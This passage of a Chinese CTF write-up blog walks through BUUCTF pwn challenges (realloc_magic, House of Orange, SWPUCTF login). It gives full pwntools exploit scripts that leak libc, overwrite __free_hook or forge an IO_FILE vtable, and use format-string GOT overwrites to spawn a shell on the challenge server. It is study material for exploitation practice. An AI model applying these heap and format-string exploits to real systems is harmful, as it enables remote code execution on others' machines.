<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207162822372.png?raw=true" alt="image-20220207162822372.png"></p>
<p>我们可以看看当我们填满了tcache时堆的样子，此时存在的堆块为0x71那么如果我们此时及进行了edit即我们申请的size&gt;realloc_ptr就可以进行edit了，那么就可以修改值了</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207162950179.png?raw=true" alt="image-20220207162950179.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0,&#39;&#39;)</span><br><span class="line">add(0x60,&#39;111&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x68 + p64(0x91) + p16(0x8760)</span><br><span class="line">add(0x170,payload)</span><br></pre></td></tr></table></figure>

<p>那么就下了我们就只要再次malloc，第二次Malloc就会达到我们想要的目的地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(0,&#39;&#39;)</span><br><span class="line">add(0x100,&#39;a&#39;)</span><br><span class="line">add(0,&#39;&#39;)</span><br><span class="line">add(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))</span><br><span class="line">这里0xfbad1887是flag位我们不用管原样填上，然后把_IO_read_xxx的部分用0填充，并把_IO_write_base的最低一个byte置为0x58，这样他就指向了_IO_2_1_stderr_+216，其中存储着 _IO_file_jumps的地址，根据它我们就能计算出libc地址</span><br><span class="line">结构图在上面</span><br></pre></td></tr></table></figure>

<p>那么泄露完我们要修改free_hook或者malloc_hook要怎么办呢？</p>
<p>我们可以故技重施一下，即把所有的代码复制一遍再来一次，但这里我们需要注意重新创建的大小不宜与之前的一样，并且在两端代码中间应该使用我们之前IDA分析的ba()函数来过渡，因为该函数可以将realloc_ptr置为0即可重新创建一个malloc而不是再次free后创建。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里是比较特殊的因为我们发现之前我们存在的堆块只能时一个堆块，而其他的都被free了，那么我们使用了这个ba()函数之后就可以存在第二个堆块了</span><br></pre></td></tr></table></figure>

<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;roarctf_2019_realloc_magic&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;roarctf_2019_realloc_magic&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def add(size,context):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Size?\n&#39;,str(size))</span><br><span class="line">	p.sendafter(&#39;Content?\n&#39;,str(context))</span><br><span class="line">def free():</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)</span><br><span class="line">def ba():</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;666&#39;)</span><br><span class="line">def pwn():</span><br><span class="line">	add(0x60,&#39;111111111111111111&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x100,&#39;2222&#39;)</span><br><span class="line"></span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x140,&#39;3333&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x100,&#39;a&#39;)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		free()</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x60,&#39;111&#39;)</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x68 + p64(0x91) + p16(0x8760)</span><br><span class="line">	add(0x170,payload)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x100,&#39;a&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))</span><br><span class="line">	libc_base &#x3D; u64(p.recvuntil(&quot;\x7f&quot;,timeout&#x3D;0.1)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">	if libc_base &#x3D;&#x3D; 0x0:</span><br><span class="line">		exit(-1)</span><br><span class="line">	print(hex(libc_base))</span><br><span class="line">	free_hook &#x3D; libc_base + 0x5648</span><br><span class="line">	libc_base &#x3D; free_hook - libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">	ba()</span><br><span class="line"></span><br><span class="line">	add(0x110,&#39;1111&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x120,&#39;2222&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x130,&#39;3333&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x120,&#39;a&#39;)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		free()</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x110,&#39;111&#39;)</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x118 + p64(0x51) + p64(free_hook-8)</span><br><span class="line">	add(0x240,payload)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x120,&#39;a&#39;)</span><br><span class="line">	add(0,&#39;&#39;)</span><br><span class="line">	add(0x120,&#39;&#x2F;bin&#x2F;sh\x00&#39;+p64(system_addr))</span><br><span class="line">	free()</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    while True:</span><br><span class="line">        p &#x3D; remote(&quot;node4.buuoj.cn&quot;,27793)</span><br><span class="line">        try:</span><br><span class="line">            pwn()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure>

<h1 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h1><h2 id="Checksec-2"><a href="#Checksec-2" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207165407635.png?raw=true" alt="image-20220207165407635.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207165418525.png?raw=true" alt="image-20220207165418525.png"></p>
<p>我们发现居然没有free函数</p>
<h2 id="利用IDA分析-1"><a href="#利用IDA分析-1" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p>edit函数中可以再次定义长度，可以实现覆盖和篡改</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207165714534.png?raw=true" alt="image-20220207165714534.png"></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>1.堆题我们需要泄露地址</p>
<p>我们发现如果没有free函数的话我们不能单独利用show来完成地址的泄露，那么我们需要找到一个办法来将莫个堆块将一个堆放入unsortbin然后show来完成泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">house of orange方法</span><br><span class="line">利用一般发生在程序没有free函数的情况下，需要伪造top chunk的size，下一次分配超过伪造的大小的chunk的时候，就会把old top chunk释放掉，放置在unorted bin中。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0x30,&#39;111\n&#39;,&#39;aaa&#39;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x30 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa)  + p64(0)*2 + p64(0xf81)</span><br><span class="line">edit(len(payload),payload,&#39;ccc&#39;,&#39;3&#39;)</span><br></pre></td></tr></table></figure>

<p>这时候我们就修改了top chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line"></span><br><span class="line">当我们申请一块内存时，malloc函数会检查各种bin，都不满足条件之后会检查top chunk是否满足，（由于本题的堆溢出使得我们可以修改topchunk的size），如果topchunk也不行，就需要调用sysmalloc来申请内存，而此时又分为brk 和 mmap两种方式</span><br><span class="line">如果所需分配的 chunk 大小大于 mmap 分配阈值（默认为 128K，0x20000），就会调用mmap</span><br><span class="line">所以我们分配的内存需要小于这个</span><br><span class="line">然后来到下一个判断</span><br><span class="line"></span><br><span class="line">assert((old_top &#x3D;&#x3D; initial_top(av) &amp;&amp; old_size &#x3D;&#x3D; 0) ||</span><br><span class="line">     ((unsigned long) (old_size) &gt;&#x3D; MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((unsigned long)old_end &amp; pagemask) &#x3D;&#x3D; 0));</span><br><span class="line"></span><br><span class="line">这里需要满足几个条件：</span><br><span class="line"></span><br><span class="line">1.topchunk size &gt; MINSIZE（0x10）</span><br><span class="line">2.top chunk inuse位为1</span><br><span class="line">3.修改之后的 size 必须要对齐到内存页</span><br><span class="line">4.满足之后，top chunk就被free，从而进入unsorted bin</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207171037979.png?raw=true" alt="image-20220207171037979.png"></p>
<p>这里要满足页对齐即后面三位相同，这也是为什么修改为0xf81的原因</p>
<p>2.利用Unsortbin来泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(0x1000,&#39;222\n&#39;,&#39;bbb&#39;,&#39;2&#39;)			--使得top chunk进入Unsortbin</span><br><span class="line">add(0x400,&#39;a&#39;*8,&#39;ccc&#39;,&#39;3&#39;)				--不完成利用unsortbin使得地址残留</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207171436538.png?raw=true" alt="image-20220207171436538.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show()</span><br><span class="line">p.recvuntil(&#39;a&#39;*8)</span><br><span class="line">leak_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-1640-0x10</span><br><span class="line">libc.address &#x3D; leak_addr - libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">system_addr &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line">io_addr &#x3D;  libc.sym[&quot;_IO_list_all&quot;]</span><br></pre></td></tr></table></figure>

<p>这里是因为如果unsortbin中只有一个的话，那么他的fd和bk皆会指向同一个地址所以可以先填充八个字节即fd</p>
<p>3.泄露堆地址</p>
<p>这个的原因我们等等再讲</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(0x10,&#39;f&#39;*0x10,&#39;199&#39;,&#39;2&#39;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#39;f&#39;*0x10)</span><br><span class="line">heap_addr &#x3D; u64(p.recvuntil(&#39;\n&#39;).strip().ljust(8,&#39;\x00&#39;)) </span><br></pre></td></tr></table></figure>

<p>因为是largbin所以还有后面0x10个字节存放的是堆地址</p>
<p>4.FSOP</p>
<p><strong>IO_FILE结构</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode</span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考链接</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;LynneHuan&#x2F;p&#x2F;14696780.html#%E6%BC%8F%E6%B4%9E%E7%82%B9</span><br></pre></td></tr></table></figure>

<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;houseoforange_hitcon_2016&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29487)</span><br><span class="line">elf &#x3D; ELF(&#39;houseoforange_hitcon_2016&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;ulibc-2.23.so&#39;)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def add(size_name,name,price,color):</span><br><span class="line">	p.sendlineafter(&#39;Your choice : &#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Length of name :&#39;,str(size_name))</span><br><span class="line">	p.recvuntil(&#39;Name :&#39;)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.sendlineafter(&#39;Price of Orange:&#39;,str(price))</span><br><span class="line">	p.sendlineafter(&#39;Color of Orange:&#39;,str(color))</span><br><span class="line">def edit(size_name,name,price,color):</span><br><span class="line">	p.sendlineafter(&#39;Your choice : &#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Length of name :&#39;,str(size_name))</span><br><span class="line">	p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.sendlineafter(&#39;Price of Orange: &#39;,str(price))</span><br><span class="line">	p.sendlineafter(&#39;Color of Orange: &#39;,str(color))</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&#39;Your choice : &#39;,&#39;2&#39;)</span><br><span class="line"></span><br><span class="line">add(0x30,&#39;111\n&#39;,&#39;aaa&#39;,&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x30 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa)  + p64(0)*2 + p64(0xf81)</span><br><span class="line">edit(len(payload),payload,&#39;ccc&#39;,&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">add(0x1000,&#39;222\n&#39;,&#39;bbb&#39;,&#39;2&#39;)</span><br><span class="line">add(0x400,&#39;a&#39;*8,&#39;ccc&#39;,&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#39;a&#39;*8)</span><br><span class="line">leak_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-1640-0x10</span><br><span class="line">libc.address &#x3D; leak_addr - libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">system_addr &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line">io_addr &#x3D;  libc.sym[&quot;_IO_list_all&quot;]</span><br><span class="line"></span><br><span class="line">edit(0x10,&#39;f&#39;*0x10,&#39;199&#39;,&#39;2&#39;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#39;f&#39;*0x10)</span><br><span class="line">heap_addr &#x3D; u64(p.recvuntil(&#39;\n&#39;).strip().ljust(8,&#39;\x00&#39;)) </span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x400 + p64(0) + p64(0x21) + p64(0)*2		</span><br><span class="line">fake_file &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;+p64(0x61)#to small bin</span><br><span class="line">fake_file +&#x3D; p64(0)+p64(io_addr-0x10)</span><br><span class="line">fake_file +&#x3D; p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr</span><br><span class="line">fake_file &#x3D; fake_file.ljust(0xc0,&#39;\x00&#39;)</span><br><span class="line">fake_file +&#x3D; p64(0) * 3</span><br><span class="line">fake_file +&#x3D; p64(heap_addr+0x508) #vtable ptr</span><br><span class="line">fake_file +&#x3D; p64(0) * 2</span><br><span class="line">fake_file +&#x3D; p64(system_addr)</span><br><span class="line">payload +&#x3D; fake_file</span><br><span class="line">edit(len(payload), payload, &#39;666&#39;, 2)</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="SWPUCTF-2019-login"><a href="#SWPUCTF-2019-login" class="headerlink" title="SWPUCTF_2019_login"></a>SWPUCTF_2019_login</h1><h2 id="Checksec-3"><a href="#Checksec-3" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211140027243.png?raw=true" alt="image-20220211140027243.png"></p>
<p>运行情况</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211140107721.png?raw=true" alt="image-20220211140107721.png"></p>
<p>输入一次用户名，密码似乎可以无限次尝试</p>
<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211140159604.png?raw=true" alt="image-20220211140159604.png"></p>
<p>当时我认为输入正确密码就可以了，然后审计完发现真确密码输入完就退出了</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p><strong>利用格式化字符串解题</strong></p>
<p>但我们发现在32位中我们的格式化字符串漏洞是出现在bss段上的，与我们平时做的题目不同</p>
<p>那么下面是网上查找到的思路</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bss段或堆上的的格式化字符串利用，我们需要在栈上找一个二级指针</span><br><span class="line">参考链接：</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222623</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211143153104.png?raw=true" alt="image-20220211143153104.png"></p>
<p>那么根据我们gdb的计算后可以知道二级指针的位置（栈地址）并且可以泄露Libc地址</p>
<p>这里主要32位中一个格式化的长度为4</p>
<p>那么我们的做法应该是先利用二级指针跳转，然后利用跳转后的地址进行栈的地址写入，然后再次利用我们写入的栈地址通过格式化字符串漏洞进行修改并get_shell</p>
<p>1.泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;Please input your password:&#39;)</span><br><span class="line">p.sendline(&#39;%6$p&#39;)</span><br><span class="line">p.recvuntil(&#39;This is the wrong password: &#39;)</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">stack_addr &#x3D; int(p.recv(8).strip(),16)</span><br><span class="line">#print(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">p.sendline(&#39;%15$p&#39;)</span><br><span class="line">p.recvuntil(&#39;This is the wrong password: &#39;)</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_addr &#x3D; int(p.recv(8).strip(),16)- 241</span><br><span class="line">libc_base &#x3D; libc_addr  - libc.sym[&#39;__libc_start_main&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line">#print(hex(libc_addr))</span><br></pre></td></tr></table></figure>

<p>2.二级指针的修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">got_addr &#x3D; (stack_addr - 4)</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(got_addr&amp;0xFF) + &#39;c%6$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211154503122.png?raw=true" alt="image-20220211154503122.png"></p>
<p>3.利用刚刚造成的跳转完成在栈地址的修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; printf_got&amp;0xff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(printf) + &#39;c%10$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211154629879.png?raw=true" alt="image-20220211154629879.png"></p>
<p>为什么要这样呢？</p>
<p>首先我们的格式化字符串最初是在.bss段上的即不在栈上，那么我们就不能直接利用格式化字符串漏洞了，于是我们利用二级指针进行跳转，创建一个可以修改的空间，我们再次利用格式化字符串漏洞对我们创建的空间进行修改，那么这时候这个空间的地址就可以改为got表了那么当我们再次利用格式化字符串漏洞时就可以利用got表攻击了</p>
<p>4.故技重施</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">got_addr &#x3D; (stack_addr - 8)</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(got_addr&amp;0xFF) + &#39;c%6$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; (printf_got+2)&amp;0xffff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(printf) + &#39;c%10$hn&#39;</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>5.got表攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system_1 &#x3D; system_addr &amp;0xffff</span><br><span class="line">system_2 &#x3D; system_addr&gt;&gt;16</span><br><span class="line">system_2 &#x3D; system_2-system_1</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; (printf_got+2)&amp;0xffff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(system_1) + &#39;c%9$hn%&#39; + str(system_2) + &#39;c%8$hn&#39;</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>6.get_shell</p>
